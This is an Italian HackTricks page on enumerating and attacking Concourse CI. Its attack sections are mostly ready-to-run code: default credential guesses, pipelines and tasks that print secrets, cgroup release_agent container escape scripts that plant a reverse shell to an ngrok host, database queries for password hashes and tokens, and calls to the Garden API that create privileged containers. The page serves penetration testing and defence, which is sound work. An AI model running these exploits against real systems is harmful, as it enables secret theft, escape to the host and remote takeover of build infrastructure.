# Enumerazione e Attacchi a Concourse

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Ruoli e Permessi Utente

Concourse viene fornito con cinque ruoli:

* _Concourse_ **Admin**: Questo ruolo viene assegnato solo ai proprietari del **team principale** (team iniziale predefinito di Concourse). Gli amministratori possono **configurare altri team** (ad esempio: `fly set-team`, `fly destroy-team`...). I permessi di questo ruolo non possono essere influenzati da RBAC.
* **owner**: I proprietari del team possono **modificare tutto all'interno del team**.
* **member**: I membri del team possono **leggere e scrivere** all'interno delle **risorse del team**, ma non possono modificare le impostazioni del team.
* **pipeline-operator**: Gli operatori di pipeline possono eseguire **operazioni di pipeline** come avviare build e fissare risorse, ma non possono aggiornare le configurazioni delle pipeline.
* **viewer**: I visualizzatori del team hanno accesso **"sola lettura" a un team** e alle sue pipeline.

{% hint style="info" %}
Inoltre, i **permessi dei ruoli owner, member, pipeline-operator e viewer possono essere modificati** configurando RBAC (configurando in modo pi√π specifico le sue azioni). Leggi di pi√π al riguardo su: [https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html)
{% endhint %}

Nota che Concourse **raggruppa le pipeline all'interno dei Team**. Pertanto, gli utenti appartenenti a un Team saranno in grado di gestire tali pipeline e **potrebbero esistere diversi Team**. Un utente pu√≤ appartenere a diversi Team e avere diverse autorizzazioni all'interno di ognuno di essi.

## Vars & Credential Manager

Nei file di configurazione YAML √® possibile configurare i valori utilizzando la sintassi `((_source-name_:_secret-path_._secret-field_))`.\
[Dalla documentazione:](https://concourse-ci.org/vars.html#var-syntax) Il **nome del sorgente √® facoltativo**, e se omesso, verr√† utilizzato il [gestore delle credenziali a livello di cluster](https://concourse-ci.org/vars.html#cluster-wide-credential-manager), o il valore pu√≤ essere fornito [staticamente](https://concourse-ci.org/vars.html#static-vars).\
Il campo _**secret-field**_ **opzionale** specifica un campo nel segreto recuperato da leggere. Se omesso, il gestore delle credenziali pu√≤ scegliere di leggere un campo 'predefinito' dal credenziale recuperata se il campo esiste.\
Inoltre, il _**secret-path**_ e il _**secret-field**_ possono essere racchiusi tra doppi apici `"..."` se **contengono caratteri speciali** come `.` e `:`. Ad esempio, `((source:"my.secret"."field:1"))` imposter√† il _secret-path_ su `my.secret` e il _secret-field_ su `field:1`.

### Static Vars

Le variabili statiche possono essere specificate nei **passaggi delle attivit√†**:
```yaml
- task: unit-1.13
file: booklit/ci/unit.yml
vars: {tag: 1.13}
```
Oppure utilizzando i seguenti **argomenti** `fly`:

* `-v` o `--var` `NOME=VALORE` imposta la stringa `VALORE` come valore per la variabile `NOME`.
* `-y` o `--yaml-var` `NOME=VALORE` analizza `VALORE` come YAML e lo imposta come valore per la variabile `NOME`.
* `-i` o `--instance-var` `NOME=VALORE` analizza `VALORE` come YAML e lo imposta come valore per la variabile di istanza `NOME`. Vedi [Raggruppamento delle pipeline](https://concourse-ci.org/instanced-pipelines.html) per saperne di pi√π sulle variabili di istanza.
* `-l` o `--load-vars-from` `FILE` carica `FILE`, un documento YAML contenente i nomi delle variabili di mapping e i relativi valori, e li imposta tutti.

### Gestione delle credenziali

Esistono diversi modi per specificare un **Gestore delle credenziali** in una pipeline, leggi come in [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html).\
Inoltre, Concourse supporta diversi gestori delle credenziali:

* [Il gestore delle credenziali Vault](https://concourse-ci.org/vault-credential-manager.html)
* [Il gestore delle credenziali CredHub](https://concourse-ci.org/credhub-credential-manager.html)
* [Il gestore delle credenziali AWS SSM](https://concourse-ci.org/aws-ssm-credential-manager.html)
* [Il gestore delle credenziali AWS Secrets Manager](https://concourse-ci.org/aws-asm-credential-manager.html)
* [Il gestore delle credenziali Kubernetes](https://concourse-ci.org/kubernetes-credential-manager.html)
* [Il gestore delle credenziali Conjur](https://concourse-ci.org/conjur-credential-manager.html)
* [Memorizzazione nella cache delle credenziali](https://concourse-ci.org/creds-caching.html)
* [Redazione delle credenziali](https://concourse-ci.org/creds-redacting.html)
* [Ripetizione dei fetch falliti](https://concourse-ci.org/creds-retry-logic.html)

{% hint style="danger" %}
Nota che se hai qualche tipo di **accesso in scrittura a Concourse** puoi creare lavori per **esfiltrare quelle segrete** poich√© Concourse deve essere in grado di accedervi.
{% endhint %}

## Enumerazione di Concourse

Per enumerare un ambiente Concourse, √® necessario **raccogliere credenziali valide** o trovare un **token autenticato** probabilmente in un file di configurazione `.flyrc`.

### Login e enumerazione dell'utente corrente

* Per effettuare il login √® necessario conoscere il **endpoint**, il **nome del team** (predefinito √® `main`) e un **team a cui l'utente appartiene**:
* `fly --target example login --team-name my-team --concourse-url https://ci.example.com [--insecure] [--client-cert=./path --client-key=./path]`
* Ottenere gli **obiettivi** configurati:
* `fly targets`
* Verificare se la connessione **all'obiettivo configurato** √® ancora **valida**:
* `fly -t <target> status`
* Ottenere il **ruolo** dell'utente rispetto all'obiettivo indicato:
* `fly -t <target> userinfo`

{% hint style="info" %}
Nota che il **token API** viene **salvato** in `$HOME/.flyrc` per impostazione predefinita, se saccheggi una macchina potresti trovarci le credenziali.
{% endhint %}

### Team e utenti

* Ottenere un elenco dei team
* `fly -t <target> teams`
* Ottenere i ruoli all'interno del team
* `fly -t <target> get-team -n <team-name>`
* Ottenere un elenco degli utenti
* `fly -t <target> active-users`

### Pipeline

* **Elencare** le pipeline:
* `fly -t <target> pipelines -a`
* **Ottenere** il file yaml della pipeline (potrebbero essere presenti informazioni **sensibili** nella definizione):
* `fly -t <target> get-pipeline -p <pipeline-name>`
* Ottenere tutte le **variabili di configurazione dichiarate** per la pipeline
* `for pipename in $(fly -t <target> pipelines | grep -Ev "^id" | awk '{print $2}'); do echo $pipename; fly -t <target> get-pipeline -p $pipename -j | grep -Eo '"vars":[^}]+'; done`
* Ottenere tutti i **nomi delle segrete utilizzate nelle pipeline** (se puoi creare/modificare un lavoro o dirottare un container, potresti esfiltrarle):
```bash
rm /tmp/secrets.txt;
for pipename in $(fly -t onelogin pipelines | grep -Ev "^id" | awk '{print $2}'); do
echo $pipename;
fly -t onelogin get-pipeline -p $pipename | grep -Eo '\(\(.*\)\)' | sort | uniq | tee -a /tmp/secrets.txt;
echo "";
done
echo ""
echo "ALL SECRETS"
cat /tmp/secrets.txt | sort | uniq
rm /tmp/secrets.txt
```
### Contenitori e Workers

* Elenco dei **workers**:
* `fly -t <target> workers`
* Elenco dei **contenitori**:
* `fly -t <target> containers`
* Elenco delle **builds** (per vedere cosa sta eseguendo):
* `fly -t <target> builds`

## Attacchi a Concourse

### Brute-Force delle credenziali

* admin:admin
* test:test

### Enumerazione di segreti e parametri

Nella sezione precedente abbiamo visto come √® possibile **ottenere tutti i nomi dei segreti e delle variabili** utilizzati dalla pipeline. Le **variabili potrebbero contenere informazioni sensibili** e il nome dei **segnreti sar√† utile in seguito per cercare di rubarli**.

### Sessione all'interno di un contenitore in esecuzione o eseguito di recente

Se si dispone di sufficienti privilegi (**ruolo di membro o superiore**) sar√† possibile **elencare le pipeline e i ruoli** e ottenere una **sessione all'interno** del contenitore `<pipeline>/<job>` utilizzando:
```bash
fly -t tutorial intercept --job pipeline-name/job-name
fly -t tutorial intercept # To be presented a prompt with all the options
```
Con queste autorizzazioni potresti essere in grado di:

* **Rubare i segreti** all'interno del **container**
* Provare a **scappare** al nodo
* Enumerare/Sfruttare il **punto di accesso ai metadati del cloud** (dal pod e dal nodo, se possibile)

### Creazione/Modifica del pipeline

Se hai abbastanza privilegi (**ruolo di membro o superiore**) sarai in grado di **creare/modificare nuove pipeline**. Controlla questo esempio:
```yaml
jobs:
- name: simple
plan:
- task: simple-task
privileged: true
config:
# Tells Concourse which type of worker this task should run on
platform: linux
image_resource:
type: registry-image
source:
repository: busybox # images are pulled from docker hub by default
run:
path: sh
args:
- -cx
- |
echo "$SUPER_SECRET"
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```
Con la **modifica/creazione** di una nuova pipeline sarai in grado di:

* **Rubare** i **segnreti** (tramite il loro echo o entrando nel container e eseguendo `env`)
* **Scappare** al **nodo** (dandoti abbastanza privilegi - `privileged: true`)
* Enumerare/Sfruttare il **punto di accesso ai metadati del cloud** (dal pod e dal nodo)
* **Eliminare** la pipeline creata

### Esegui un Task Personalizzato

Questo √® simile al metodo precedente, ma invece di modificare/creare un'intera nuova pipeline, puoi **solo eseguire un task personalizzato** (che probabilmente sar√† molto pi√π **furtivo**):
```yaml
# For more task_config options check https://concourse-ci.org/tasks.html
platform: linux
image_resource:
type: registry-image
source:
repository: ubuntu
run:
path: sh
args:
- -cx
- |
env
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```
### Fuga al nodo da un compito privilegiato

Nelle sezioni precedenti abbiamo visto come **eseguire un compito privilegiato con Concourse**. Ci√≤ non dar√† al contenitore lo stesso accesso del flag privilegiato in un contenitore Docker. Ad esempio, non vedrai il dispositivo del filesystem del nodo in /dev, quindi la fuga potrebbe essere pi√π "complessa".

Nel seguente PoC useremo il release\_agent per fuggire con alcune piccole modifiche:
```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix it
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release


# CHANGE ME
# The host path will look like the following, but you need to change it:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

## The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

## Then next part I think is constant "hostpath-provisioner/default/"

## For the next part "concourse-work-dir-concourse-release-worker-0" you need to know how it's constructed
# "concourse-work-dir" is constant
# "concourse-release" is the consourse prefix of the current concourse env (you need to find it from the API)
# "worker-0" is the name of the worker the container is running in (will be usually that one or incrementing the number)

## The final part "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" is kind of constant
# running `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` you will see something like:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# the UID is the part we are looking for

# Then the host_path is:
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% hint style="warning" %}
Come avrai notato, si tratta solo di una [**fuga regolare dell'agente di rilascio**](broken-reference) modificando leggermente il percorso del cmd nel nodo
{% endhint %}

### Fuga verso il nodo da un contenitore Worker

Una fuga regolare dell'agente di rilascio con una modifica minore √® sufficiente per questo:
```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -n 1`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
### Fuga al nodo dal contenitore Web

Anche se il contenitore Web ha alcune difese disabilitate, **non viene eseguito come un comune contenitore privilegiato** (ad esempio, **non √® possibile montare** e le **capacit√†** sono molto **limitate**, quindi tutti i modi facili per fuggire dal contenitore sono inutili).

Tuttavia, memorizza le **credenziali locali in chiaro**:
```bash
cat /concourse-auth/local-users
test:test

env | grep -i local_user
CONCOURSE_MAIN_TEAM_LOCAL_USER=test
CONCOURSE_ADD_LOCAL_USER=test:test
```
Puoi utilizzare quelle credenziali per effettuare il **login sul server web** e **creare un container privilegiato e sfuggire al nodo**.

Nell'ambiente puoi anche trovare informazioni per **accedere all'istanza di postgresql** che concourse utilizza (indirizzo, **nome utente**, **password** e database, tra altre informazioni):
```bash
env | grep -i postg
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_ADDR=10.107.191.238
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_PORT=5432
CONCOURSE_RELEASE_POSTGRESQL_SERVICE_PORT_TCP_POSTGRESQL=5432
CONCOURSE_POSTGRES_USER=concourse
CONCOURSE_POSTGRES_DATABASE=concourse
CONCOURSE_POSTGRES_PASSWORD=concourse
[...]

# Access the postgresql db
psql -h 10.107.191.238 -U concourse -d concourse
select * from password; #Find hashed passwords
select * from access_tokens;
select * from auth_code;
select * from client;
select * from refresh_token;
select * from teams; #Change the permissions of the users in the teams
select * from users;
```
### Abuso del servizio Garden - Non un vero attacco

{% hint style="warning" %}
Queste sono solo alcune note interessanti sul servizio, ma poich√© √® in ascolto solo su localhost, queste note non avranno alcun impatto che non abbiamo gi√† sfruttato in precedenza.
{% endhint %}

Per impostazione predefinita, ogni worker di Concourse eseguir√† un servizio [**Garden**](https://github.com/cloudfoundry/garden) sulla porta 7777. Questo servizio viene utilizzato dal Web master per indicare al worker **cosa deve eseguire** (scaricare l'immagine e eseguire ogni attivit√†). Questo sembra molto interessante per un attaccante, ma ci sono alcune buone protezioni:

* √à esposto solo **localmente** (127.0.0.1) e penso che quando il worker si autentica nuovamente sul Web con il servizio SSH speciale, viene creato un tunnel in modo che il server Web possa **comunicare con ogni servizio Garden** all'interno di ogni worker.
* Il server Web **monitora i contenitori in esecuzione ogni pochi secondi**, e i contenitori **inesperati** vengono **eliminati**. Quindi, se si desidera **eseguire un contenitore personalizzato**, √® necessario **manipolare** la **comunicazione** tra il server Web e il servizio Garden.

I worker di Concourse vengono eseguiti con privilegi elevati del contenitore:
```
Container Runtime: docker
Has Namespaces:
pid: true
user: false
AppArmor Profile: kernel
Capabilities:
BOUNDING -> chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read
Seccomp: disabled
```
Tuttavia, tecniche come il **montaggio** del dispositivo /dev del nodo o il **release\_agent** **non funzioneranno** (poich√© il dispositivo reale con il filesystem del nodo non √® accessibile, solo uno virtuale). Non possiamo accedere ai processi del nodo, quindi sfuggire al nodo senza exploit del kernel diventa complicato.

{% hint style="info" %}
Nella sezione precedente abbiamo visto come sfuggire da un container privilegiato, quindi se possiamo **eseguire** comandi in un **container privilegiato** creato dal **worker** **corrente**, potremmo **sfuggire al nodo**.
{% endhint %}

Nota che giocando con Concourse ho notato che quando viene creato un nuovo container per eseguire qualcosa, i processi del container sono accessibili dal container del worker, quindi √® come se un container creasse un nuovo container al suo interno.

#### Entrare in un container privilegiato in esecuzione
```bash
# Get current container
curl 127.0.0.1:7777/containers
{"Handles":["ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

# Get container info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/properties

# Execute a new process inside a container
## In this case "sleep 20000" will be executed in the container with handler ac793559-7f53-4efc-6591-0171a0391e53
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'

# OR instead of doing all of that, you could just get into the ns of the process of the privileged container
nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
```
#### Creazione di un nuovo container privilegiato

√à possibile creare facilmente un nuovo container (eseguendo un UID casuale) ed eseguire qualcosa su di esso:
```bash
curl -X POST http://127.0.0.1:7777/containers \
-H 'Content-Type: application/json' \
-d '{"handle":"123ae8fc-47ed-4eab-6b2e-123458880690","rootfs":"raw:///concourse-work-dir/volumes/live/ec172ffd-31b8-419c-4ab6-89504de17196/volume","image":{},"bind_mounts":[{"src_path":"/concourse-work-dir/volumes/live/9f367605-c9f0-405b-7756-9c113eba11f1/volume","dst_path":"/scratch","mode":1}],"properties":{"user":""},"env":["BUILD_ID=28","BUILD_NAME=24","BUILD_TEAM_ID=1","BUILD_TEAM_NAME=main","ATC_EXTERNAL_URL=http://127.0.0.1:8080"],"limits":{"bandwidth_limits":{},"cpu_limits":{},"disk_limits":{},"memory_limits":{},"pid_limits":{}}}'

# Wget will be stucked there as long as the process is being executed
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
```
Tuttavia, il server web controlla ogni pochi secondi i container in esecuzione e, se ne viene scoperto uno inaspettato, lo elimina. Poich√© la comunicazione avviene tramite HTTP, √® possibile manipolare la comunicazione per evitare l'eliminazione dei container inaspettati:
```
GET /containers HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
.

T 127.0.0.1:7777 -> 127.0.0.1:59722 [AP] #157
HTTP/1.1 200 OK.
Content-Type: application/json.
Date: Thu, 17 Mar 2022 22:42:55 GMT.
Content-Length: 131.
.
{"Handles":["123ae8fc-47ed-4eab-6b2e-123458880690","ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

T 127.0.0.1:59722 -> 127.0.0.1:7777 [AP] #159
DELETE /containers/123ae8fc-47ed-4eab-6b2e-123458880690 HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
```
# Riferimenti
* https://concourse-ci.org/vars.html

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>
